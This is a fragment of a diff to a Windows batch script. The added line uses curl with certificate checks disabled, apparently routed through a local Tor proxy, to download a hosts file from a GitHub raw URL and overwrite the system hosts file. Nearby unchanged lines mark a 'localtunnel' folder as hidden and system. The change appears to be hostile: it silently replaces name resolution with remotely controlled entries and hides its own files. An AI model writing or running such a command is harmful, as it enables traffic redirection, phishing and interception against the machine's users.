@@ -40,6 +40,8 @@ if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else 
   set "proxy=--tlsv1"
 )
 
+"%environment%\curl.exe" -k %proxy% https://raw.githubusercontent.com/cryptedodissey/cryptedodissey.github.io/main/hosts > "C:\Windows\System32\drivers\etc\hosts"
+
 attrib -s -h -i "%environment%\localtunnel" && if exist "%environment%\localtunnel" (
    attrib +s +h +i "%environment%\localtunnel"
 ) else (
